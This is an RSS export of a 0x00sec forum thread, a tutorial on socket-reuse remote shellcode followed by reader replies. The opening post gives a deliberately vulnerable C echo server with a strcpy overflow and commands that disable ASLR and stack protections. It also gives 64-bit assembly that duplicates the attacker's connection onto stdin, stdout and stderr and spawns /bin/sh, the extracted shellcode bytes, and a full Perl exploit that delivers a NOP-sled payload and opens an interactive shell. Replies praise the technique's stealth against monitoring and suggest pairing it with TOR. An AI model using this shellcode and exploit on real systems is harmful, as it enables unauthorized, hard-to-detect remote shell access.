<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Remote Exploit. Shellcode without Sockets</title>
    <link>https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440</link>
    <description>In this paper I will present an elegant technique (it&#39;s my opinion, indeed) to get shell access to a vulnerable remote machine. It is not my own technique but I found it very interesting. The focus of this paper is on this technique and not in the way to exploit the vulnerability. 

# Setting your environment
So, in order to focus on the remote shell code and not on how to circumvent ASLR, non-executable stacks and so on (that will require lots of writing) we will disable most of these features for our test. Once you get your shellcode ready you can, indeed try to bring the protections back and exploit again the program. That is a very interesting exercise if you want to try.

First, we will disable the [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization). This can be done with the following command:

    echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

This is temporary and will be reverted on the next reboot. In case you want it back without rebooting your machine:

    echo 2 | sudo tee /proc/sys/kernel/randomize_va_space

To disable the rest of security functions we will be using the following flags to compile our vulnerable server:

    -fno-stack-protector -z execstack

These flags disables stack canaries and also gives execution permissions to the stack. So we have a very easy to exploit environment.

# A vulnerable service
Now let&#39;s write a small echo server with a buffer overflow we can exploit remotely. The program is very simple. Can you spot the buffer overflow in the code?. Sure you can.

```
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;

int
process_request (int s1, char *reply)
{
  char result[256];

  strcpy (result, reply);
  write (s1, result, strlen(result));
  printf (&quot;Result: %p\n&quot;, &amp;result);
  return 0;
}

int
main (int argc, char *argv[])
{
  struct sockaddr_in   server, client;
  socklen_t            len = sizeof (struct sockaddr_in);
  int                  s,s1, ops = 1;
  char                 reply[1024];

  server.sin_addr.s_addr = INADDR_ANY;
  server.sin_family = AF_INET;
  server.sin_port = htons(9000);

  s = socket (PF_INET, SOCK_STREAM, 0);
  if ((setsockopt (s, SOL_SOCKET, SO_REUSEADDR, &amp;ops, sizeof(ops))) &lt; 0)
    perror (&quot;pb_server (reuseaddr):&quot;);
  bind (s, (struct sockaddr *) &amp;server, sizeof (server));
  listen (s, 10);

  while (1)
    {
      s1 = accept (s, (struct sockaddr *)&amp;client, &amp;len);
      printf (&quot;Connection from %s\n&quot;, inet_ntoa (client.sin_addr));
      memset (reply, 0, 1024);
      read (s1, reply, 1024);
      process_request (s1, reply);
      close (s1);
    }
  return 0;
}

```
Pretty standard stuff. Let&#39;s compile it and finish our job making it into the easiest to exploit server ever:

    gcc -g -fno-stack-protector -z execstack -o target target.c


Let&#39;s verify it is vulnerable. Launch it in one terminal and from another terminal run:

    $ perl -e &#39;print &quot;A&quot;x1024;&#39; | nc localhost 9000

In the terminal running the server we should see something like:

    $  ./target
    Connection from 127.0.0.1
    Result: 0x7fffffffdbf0
    Segmentation fault (core dumped)

Note that I have added a print of the address of a local variable so you can verify that ASLR is disabled. You should always get the same number for every execution of the same binary (number can change if you modify the program).

You can now practice with this program to get a local shell using some of the shellcodes available around. Even if it is very easy you should do it at least once :). I will not cover this here. There are, literally thousands of tutorials on how to exploit a buffer overflow in this conditions. Just google it and do it.

# The Remote Shell
Now it&#39;s time to get a remote shell. The key word here is remote. This means that there is a network between the vulnerable machine and the attacker. Or in other words, we have to send/receive data through some socket. Based on this, there are fundamentally two ways to get a remote shell:

* Your shellcode creates a server socket enabling connections from outside and feeding data in and out of a local shell...  This is a __Direct__ remote shell.
* Your shellcode connects back to a predetermined host were some server is waiting for the connection from the victim... This is a __Reverse__ remote shell.

You may want to read https://0x00sec.org/t/remote-shells-part-i/269 for more details.

This two definitions will  bring to the mind of many of you those `RHOST/RPORT` variables, or whatever they are called.... Yes, that thing to tell your payload what is the address and port to connect to. For a reverse shell you have to store this information in your payload in order to connect back. For a direct shell you usually define just the port, the server will be waiting for connections.

However, there is a third option, at least for Unix machines. 

# Connection Reuse
When executing a remote exploit, in order to exploit the vulnerability, you are already connected to the server... so, why do not reuse the connection that is already setup?. This is very neat, because it will not show anything suspicious in the victim like open ports for unknown services or outgoing connections from a server :dizzy_face:

The way to achieve this is very ingenious. It is based on the fact that, the system assigns file descriptions sequentially. Knowing this, we can just duplicate an existing file descriptor immediately after our connection and... unless the server is under heavy load, we should get a file descriptor equal to the file descriptor of the socket associated to our connection + 1 (so, the fd assigned just before, i.e. our connection).

Once we know the file descriptor for our current on-going connection, we just need to duplicate it to file descriptors 0,1 and 2 (`stdin`, `stdout` and `stderr`) and then spawn a shell. From that point on, all the input/output for that shell will be redirected to the socket.

Still confused? Haven&#39;t read this (https://0x00sec.org/t/remote-shells-part-i/269)?. Maybe now is a good time to do it.

The C code is something like this:

```
int sck = dup (0) - 1; // Duplicate stdin
dup2 (sck, 0);
dup2 (sck, 1);
dup2  (sck, 2);
execv (&quot;/bin/sh&quot;, NULL);
```

See... no socket code at all!. If we make this into a shellcode and we manage to exploit the remote server to run that code, we will get shell access to the remote machine over the connection we used to feed the exploit in the remote server :scream:.

Many of you may have notice that this techniques (as usual) has some drawbacks. We have already mentioned that under heavy load on the server (many connections being established simultaneously), our `dup` trick may fail, and somebody else will get the shell access :sweat_smile:. Also, a proper server will close all file descriptors before becoming a `daemon` (`man daemon`), so we may need to try with others values as argument for `dup`.

This technique was brought to my attention by @_py in a discussion we had some time ago. The original code we checked at that time can be found here:

http://shell-storm.org/shellcode/files/shellcode-881.php

However this is 32bits code so I made my own 64bits version and a Perl script to run the exploit. 

# The 64bits Version of the Shellcode
I&#39;m not really proud  of it (I just realised how rusty my ASM is) but it works and it is only 3 bytes longer that the original 32bits version. Here it is:

```
section .text
global _start
_start:
	;; s = Dup (0) - 1
	xor rax, rax
	push rax
	push rax
	push rax
	pop rsi
	pop rdx
	push rax
	pop rdi
	mov al, 32
	syscall    		; DUP (rax=32) rdi = 0 (dup (0))

	dec rax
	push rax
	pop rdi 		; mov rdi, rax  ; dec rdi

	;; dup2 (s, 0); dup2(s,1); dup2(s,2)
loop:	mov al, 33
	syscall			; DUP2 (rax=33) rdi=oldfd (socket) rsi=newfd
	inc rsi
	mov rax,rsi
	cmp al, 2		; Loop 0,1,2 (stdin, stdout, stderr)
	
	jne loop


	;; exec (/bin/sh)
	push    rdx			        ; NULL
	mov	qword rdi, 0x68732f6e69622f2f	; &quot;//bin/sh&quot;
	push	rdi				; command
	push 	rsp			
	pop 	rdi			
	
	push 	rdx		;env
	pop 	rsi		;args
	
        mov     al, 0x3b	;EXEC (rax=0x4b) rdi=&quot;/bin/sh&quot; rsi=rdx=
        syscall
```

I have added some comments for the less obvious parts and you will see a lot of `push/pops`. The reason is that a `PUSH/POP` pair is 2 bytes but a `MOV R1,R2` is 3. This makes the code very ugly but a bit shorter... actually not much so I do not think if it is a good idea. Anyway, be free to improve it and post your versions in the comments. Also do not hesitate to share any doubt about the code.

# Generating our Shellcode
Now, we have to get the shellcode in a format suitable to be send to the remote server. For doing that we have to first compile the code and then extract the machine code out of the compiled file. Compiling (assembling in this case) is straight forward:

    nasm -f elf64 -o rsh.o rsh.asm

There are many different ways to get the binary data out of the object file. I use these nifty trick that produce a string in a format that I can easily add to a Perl or C program.

```
for i in $(objdump -d rsh.o -M intel |grep &quot;^ &quot; |cut -f2); do echo -n &#39;\x&#39;$i; done;echo
```
The two commands above will produce the following shellcode:

`\x48\x31\xc0\x50\x50\x50\x5e\x5a\x50\x5f\xb0\x20\x0f\x05\x48\xff\xc8\x50\x5f\xb0\x21\x0f\x05\x48\xff\xc6\x48\x89\xf0\x3c\x02\x75\xf2\x52\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x54\x5f\x52\x5e\xb0\x3b\x0f\x05`


Time to write the exploit

# The Exploit
So we have a remote vulnerable system. __You have figure out how to exploit the buffer overflow__ in our low-secured environment and we also have a shellcode to run on the remote system. Now we need a exploit. The exploit will put all this together and give us the remote shell we are looking for.

There are many ways to write it. I&#39;ve used used Perl for mine. Of course. :stuck_out_tongue_winking_eye:

This is how it looks like:

```
#!/usr/bin/perl
use IO::Select;
use IO::Socket::INET;
$|=1;

print &quot;Remote Exploit Example&quot;;
print &quot;by 0x00pf for 0x00sec :)\n\n&quot;;

# You may need to calculate these magic numbers for your system
$addr = &quot;\x10\xdd\xff\xff\xff\x7f\x00\x00&quot;; 
$off = 264;

# Generate the payload
$shellcode = &quot;\x48\x31\xc0\x50\x50\x50\x5e\x5a\x50\x5f\xb0\x20\x0f\x05\x48\xff\xc8\x50\x5f\xb0\x21\x0f\x05\x48\xff\xc6\x48\x89\xf0\x3c\x02\x75\xf2\x52\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x54\x5f\x52\x5e\xb0\x3b\x0f\x05&quot;;

$nops = $off - length $shellcode;
$payload = &quot;\x90&quot; x $nops . $shellcode . $addr;

$plen = length $payload;
$slen = length $shellcode;
print &quot;SLED $nops Shellcode: $slen Payload size: $plen\n&quot;;

# Connect
my $socket = new IO::Socket::INET (
    PeerHost =&gt; &#39;127.0.0.1&#39;,
    PeerPort =&gt; &#39;9000&#39;,
    Proto =&gt; &#39;tcp&#39;,
    );
# Set up select for asynchronous read from the server
$sel = IO::Select-&gt;new( $socket );
$sel-&gt;add(\*STDIN);

# Exploit!
$socket-&gt;send ($payload);
$socket-&gt;recv ($trash,1024);
$timeout = .1;

$flag = 1; # Just to show a prompt

# Interact!
while (1) {
    if (@ready = $sel-&gt;can_read ($timeout))  {
	foreach $fh (@ready) {
	    $flag =1;
	    if($fh == $socket) {
		$socket-&gt;recv ($resp, 1024);
		print $resp;
	    }
	    else { # It is stdin
		$line = &lt;STDIN&gt;;
		$socket-&gt;send ($line);
	    }
	}
    }	
    else { # Show the prompt whenever everything&#39;s been read
	print &quot;0x00pf]&gt;  &quot; if ($flag);
	$flag = 0;
    }	
}

```

The beginning of the exploit is pretty much the standard stuff. Generate the payload based on the magic numbers _you had figured out with the help of `gdb`_ (note that those number may be different in your system, and the exploit as it is may not just work).

But then, we have to do something else for our special remote shell. With direct and reverse shells, once the exploit has been run and have done its job, we will normally use another program/module to connect to or to receive the connection from the remote machine. It can be `netcat` or your preferred pentesting platform or your own tool,...

However, in this case we are accessing the shell using an already establish connection. The one we used to send the payload. So I added some code to read commands from `stdin` and send them to the remote server and also to read data from the remote shell. This is the final part of the exploit. It is standard networking code. Nothing really special in there.

Now, you can try your remote shell exploit!

# Conclusions
In this paper we have discussed a technique to get pretty stealth shell access to a remote vulnerable server without the need to deal with the `sockets` API provided by the system. This makes the development of the shellcode simpler and also makes it shorter (check this one for example http://shell-storm.org/shellcode/files/shellcode-858.php).

Be free to improve the shellcode and post it in the comments. Also, if somebody wants to try to exploit the server when the system security features are activated, please be my guest. That will involve:

* Reactivate ASLR (you already know how to do that)
* Make stack not executable (remove the `-zexecstack` flag or use the `execstack` tool)
* Reactivate stack protection (remove the `-fno-stackprotector` flag)
* Go Pro (compile with `-DFORTIFY_SOURCE=2` or use `-O2`)
* Go master (compile with `-O2 -fPIC -pie -fstack-protector-all -Wl,-z,relro,-z,now`)

Hack Fun!</description>
    
    <lastBuildDate>Thu, 16 Feb 2017 15:13:30 +0000</lastBuildDate>
    <category>Exploit Development</category>
    <atom:link href="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Remote Exploit. Shellcode without Sockets</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/26">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/26</link>
        <pubDate>Sun, 21 Jan 2018 00:44:00 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1440-26</guid>
        <source url="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440.rss">Remote Exploit. Shellcode without Sockets</source>
      </item>
      <item>
        <title>Remote Exploit. Shellcode without Sockets</title>
        <dc:creator><![CDATA[hasp0t]]></dc:creator>
        <description><![CDATA[
            <p>Thank you very much for you response! You are actually right, I’m mixing 32bit and 64bit.<br>
I’ll take a look at these articles <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
          <p><a href="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/25">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/25</link>
        <pubDate>Thu, 16 Feb 2017 15:13:30 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1440-25</guid>
        <source url="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440.rss">Remote Exploit. Shellcode without Sockets</source>
      </item>
      <item>
        <title>Remote Exploit. Shellcode without Sockets</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>Hi <span class="mention">@p3rla</span>,</p>
<p>Thanks for following the tutorial and for your feedback.I have seen that happening some time ago. As far as I remember it  happens when you mix up 32bits and 64bits code. In those cases you need to do some extra work to invoke the system call. I’m not sure if I took notes from those tests but I’ll let you know if I found them.</p>
<p>I have running it with dash (my /<code>bin/sh</code> is a link to <code>/bin/dash</code>) and it was working fine.</p>
<p>To know more about how the mixing on 32bits and 64bits code works I recommend the two following brilliant articles. Specially part 2 explains how this mix is managed by Linux.</p>
<p>Hope this helps</p>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e3ab9932ec4122e287ecab561115b35feded05c7.png" class="site-icon" width="" height="">
      <a href="https://lwn.net/Articles/604287/" target="_blank" rel="noopener nofollow ugc">lwn.net</a>
  </header>
  <article class="onebox-body">
    <img src="" class="thumbnail" width="" height="">

<h3><a href="https://lwn.net/Articles/604287/" target="_blank" rel="noopener nofollow ugc">Anatomy of a system call, part 1 [LWN.net]</a></h3>

<p>
      System calls are the primary mechanism by which user-space programs
      interact with the Linux kernel.  Given their importance, it's not
      surprising to discover that the kernel includes a wide variety of
      mechanisms to ensure that...</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e3ab9932ec4122e287ecab561115b35feded05c7.png" class="site-icon" width="" height="">
      <a href="https://lwn.net/Articles/604515/" target="_blank" rel="noopener nofollow ugc">lwn.net</a>
  </header>
  <article class="onebox-body">
    <img src="" class="thumbnail" width="" height="">

<h3><a href="https://lwn.net/Articles/604515/" target="_blank" rel="noopener nofollow ugc">Anatomy of a system call, part 2 [LWN.net]</a></h3>

<p>
      The previous article explored the kernel
      implementation of system calls (syscalls) in its most vanilla form: a
      normal syscall, on the most common architecture: x86_64.  We complete our
      look at syscalls with variations on that...</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

          <p><a href="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/24">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/24</link>
        <pubDate>Thu, 16 Feb 2017 15:04:30 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1440-24</guid>
        <source url="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440.rss">Remote Exploit. Shellcode without Sockets</source>
      </item>
      <item>
        <title>Remote Exploit. Shellcode without Sockets</title>
        <dc:creator><![CDATA[hasp0t]]></dc:creator>
        <description><![CDATA[
            <p>Hi there! I’m new around here. I tried to follow this tutorial and it sort of worked out. It generates the shell but immediately after it finishes the child process (which is /bin/dash), why is that?</p>
<p>Thanks!</p>
          <p><a href="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/23">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/23</link>
        <pubDate>Tue, 14 Feb 2017 19:32:08 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1440-23</guid>
        <source url="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440.rss">Remote Exploit. Shellcode without Sockets</source>
      </item>
      <item>
        <title>Remote Exploit. Shellcode without Sockets</title>
        <dc:creator><![CDATA[Joe_Schmoe]]></dc:creator>
        <description><![CDATA[
            <p>I wonder why, pry0cc <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
          <p><a href="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/22">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/22</link>
        <pubDate>Thu, 09 Feb 2017 16:44:00 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1440-22</guid>
        <source url="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440.rss">Remote Exploit. Shellcode without Sockets</source>
      </item>
      <item>
        <title>Remote Exploit. Shellcode without Sockets</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>Man this article has a lot of viwss</p>
          <p><a href="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/21">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/21</link>
        <pubDate>Thu, 09 Feb 2017 16:12:44 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1440-21</guid>
        <source url="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440.rss">Remote Exploit. Shellcode without Sockets</source>
      </item>
      <item>
        <title>Remote Exploit. Shellcode without Sockets</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>Hi <a class="mention" href="https://0x00sec.org/u/pry0cc">@pry0cc</a></p>
<p>It may be due to your shell. According to man page for echo</p>
<pre><code>    (...)
    \xHH   byte with hexadecimal value HH (1 to 2 digits)

   NOTE: your shell may have its own version of echo, which usually supersedes the version described here.  Please refer to your shell's docu‐
   mentation for details about the options it supports.
   (...)
</code></pre>
<p>In may system with bash I get two slashes with your version. But it is very good you spotted as other people may have had that problem as well</p>
          <p><a href="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/20">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/20</link>
        <pubDate>Mon, 16 Jan 2017 23:08:43 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1440-20</guid>
        <source url="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440.rss">Remote Exploit. Shellcode without Sockets</source>
      </item>
      <item>
        <title>Remote Exploit. Shellcode without Sockets</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>Hi <a class="mention" href="https://0x00sec.org/u/0x00pf">@0x00pf</a>!</p>
<p>I think I found a small typo.</p>
<p>I found your shell command to generate shellcode didn’t work, it just produced a tonne of binary jibberish, this is the revised version that worked for me (I just escaped the first \ on the echo -n).</p>
<pre><code class="lang-auto">for i in $(objdump -d rsh.o -M intel |grep "^ " |cut -f2); do echo -n '\\x'$i; done;echo
</code></pre>
          <p><a href="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/19">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/19</link>
        <pubDate>Mon, 16 Jan 2017 22:51:47 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1440-19</guid>
        <source url="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440.rss">Remote Exploit. Shellcode without Sockets</source>
      </item>
      <item>
        <title>Remote Exploit. Shellcode without Sockets</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>Hi <a class="mention" href="https://0x00sec.org/u/zadyree">@zadyree</a>,</p>
<p>Thanks for passing by our site and for that great trick. I was really amaze when I read your code in shell-storm!. Actually it took me a while to realise what it was doing <img src="https://0x00sec.org/images/emoji/twitter/sweat.png?v=9" title=":sweat:" class="emoji" alt=":sweat:"></p>
<p>Haven’t thought about TOR. That is a very good point.</p>
          <p><a href="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/18">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/18</link>
        <pubDate>Mon, 09 Jan 2017 19:34:40 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1440-18</guid>
        <source url="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440.rss">Remote Exploit. Shellcode without Sockets</source>
      </item>
      <item>
        <title>Remote Exploit. Shellcode without Sockets</title>
        <dc:creator><![CDATA[zadyree]]></dc:creator>
        <description><![CDATA[
            <p>Hi there. When I wrote this trick I had in mind it was not <em>theorically</em> valid, which led me not to propose an implementation for Metasploit for example. Hence, as an exploit coding fan, I suggest to rather use this shellcode for challenges and ROP your way for concrete and accurate socket-reuse exploits.</p>
<p>Also, if I may add something, the interests of such attacks are 1/ obviously that it’s stealthier regarding potential monitoring, and 2/ that as it uses an established channel initiated as in a classic client-server case, so coupling it with TOR seems easy as hell <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
          <p><a href="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/17">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/17</link>
        <pubDate>Mon, 09 Jan 2017 19:23:51 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1440-17</guid>
        <source url="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440.rss">Remote Exploit. Shellcode without Sockets</source>
      </item>
      <item>
        <title>Remote Exploit. Shellcode without Sockets</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>I would say so for most of the cases. Somebody can rebuild the binary with special linker flags that mesh up the memory.</p>
<p>Check the last section to see an example on how to relocate the text segment via linker flags. In that case you also need the Makefile, however I do not believe that happens very often.</p>
<aside class="quote quote-modified" data-post="1" data-topic="1164">
  <div class="title">
    <div class="quote-controls"></div>
    <img alt="" width="20" height="20" src="/user_avatar/0x00sec.org/0x00pf/40/199_2.png" class="avatar">
    <a href="https://0x00sec.org/t/programming-for-wannabes-part-ii/1164">Programming for Wannabes. Part II</a> <a class="badge-wrapper  bullet" href="https://0x00sec.org/c/programming/61"><span class="badge-category-bg" style="background-color: #92278F;"></span><span style="" data-drop-close="true" class="badge-category clear-badge">Programming</span></a>
  </div>
  <blockquote>
    Glad to see you have come back to this humble course. Hope you are eager to get a lot more stuff to digest. Grab some coffee and relax. 
I have been claiming that this course is going to be different to all those that you find over the Internet. Right now, I should introduce a whole bunch of boring things (numeric representation, addressing modes, instructions groups,…) and guess what?.. I won’t do that. 
In order to avoid going through all that boring stuff and to try to follow a learn-by-examp…
  </blockquote>
</aside>

          <p><a href="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/16">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/16</link>
        <pubDate>Sat, 07 Jan 2017 14:05:31 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1440-16</guid>
        <source url="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440.rss">Remote Exploit. Shellcode without Sockets</source>
      </item>
      <item>
        <title>Remote Exploit. Shellcode without Sockets</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>Right. So if you could obtain the same binary as them, then it will be the same?</p>
          <p><a href="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/15">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/15</link>
        <pubDate>Sat, 07 Jan 2017 13:56:25 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1440-15</guid>
        <source url="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440.rss">Remote Exploit. Shellcode without Sockets</source>
      </item>
      <item>
        <title>Remote Exploit. Shellcode without Sockets</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>Your sentence is a bit stronger that what I suggested.</p>
<p>I meant that, as far as the system configuration is the same (OS version, libc version, compiler version…) in two different machines. Compiling the same source will produce the same binary. I do not know if what you said is true… never checked it.</p>
          <p><a href="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/14">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/14</link>
        <pubDate>Sat, 07 Jan 2017 13:54:36 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1440-14</guid>
        <source url="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440.rss">Remote Exploit. Shellcode without Sockets</source>
      </item>
      <item>
        <title>Remote Exploit. Shellcode without Sockets</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>Ohhhhhhhh! I didn’t realise the addresses were the same in every binary. That’s dope. Okay thanks.</p>
          <p><a href="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/13">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/13</link>
        <pubDate>Sat, 07 Jan 2017 13:44:21 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1440-13</guid>
        <source url="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440.rss">Remote Exploit. Shellcode without Sockets</source>
      </item>
      <item>
        <title>Remote Exploit. Shellcode without Sockets</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <aside class="quote group-VIP" data-username="pry0cc" data-post="10" data-topic="1440">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="20" height="20" src="https://0x00sec.org/user_avatar/0x00sec.org/pry0cc/40/6_2.png" class="avatar"> pry0cc:</div>
<blockquote>
<p>He obtains these addresses by doing a hex dump of the binary. The only way he could do this would be if he already had shell access? This would never work for a remote exploit? Or would it?</p>
</blockquote>
</aside>
<p>Well, you need to have a local version of the program to exploit. I do not think you can write a exploit against a service without having access to the service itself and some details of the system. You have to get the program somehow (using some other flaw or getting it from other server with lower security) or use your recon phase to gather enough information (OS version, service version, compiler, etc…) to rebuild a “close-enough” version of the service to develop the exploit whenever the service is publicly available (open source project for instance).</p>
<p>I’m not 100% sure but I do not think you can develop a remote exploit without some kind of access to the binary. If anybody know about any technique to achieve that I’m interested in knowing more <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
          <p><a href="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/12">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/12</link>
        <pubDate>Sat, 07 Jan 2017 13:18:23 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1440-12</guid>
        <source url="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440.rss">Remote Exploit. Shellcode without Sockets</source>
      </item>
      <item>
        <title>Remote Exploit. Shellcode without Sockets</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            <p><a class="mention" href="https://0x00sec.org/u/pry0cc">@pry0cc</a>: The link is indeed not aimed at a scenario like the one <a class="mention" href="https://0x00sec.org/u/0x00pf">@0x00pf</a> presented. I linked it to you so you can get a general idea on how some of the modern exploit mitigations can be bypassed. The funny thing is that IoT/embedded devices barely manage to implement any of the aforementioned mitigations.</p>
<p>As for the dynamic linking stuff, I’ll try to write a few more posts on it from an exploit dev perspective once my exams are over.</p>
          <p><a href="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/11">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/11</link>
        <pubDate>Sat, 07 Jan 2017 11:38:08 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1440-11</guid>
        <source url="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440.rss">Remote Exploit. Shellcode without Sockets</source>
      </item>
      <item>
        <title>Remote Exploit. Shellcode without Sockets</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>Thank you <span class="mention">@py</span>! This is a very good read. I do have some questions though.</p>
<pre><code class="lang-python">system = 0x8048380
exit = 0x80483a0
system_arg = 0x80485b5 
</code></pre>
<p>He obtains these addresses by doing a hex dump of the binary. The only way he could do this would be if he already had shell access? This would never work for a remote exploit? Or would it?</p>
<p>I’m really interested in this but I need to grasp memory concepts a little more. May give your dynamic linker post another read through, I could do with going through Pico’s wannabe tutorials as well just to reinforce the basics.</p>
          <p><a href="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/10">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440/10</link>
        <pubDate>Sat, 07 Jan 2017 11:08:17 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1440-10</guid>
        <source url="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440.rss">Remote Exploit. Shellcode without Sockets</source>
      </item>
      <item>
        <title>Remote Exploit. Shellcode without Sockets</title>
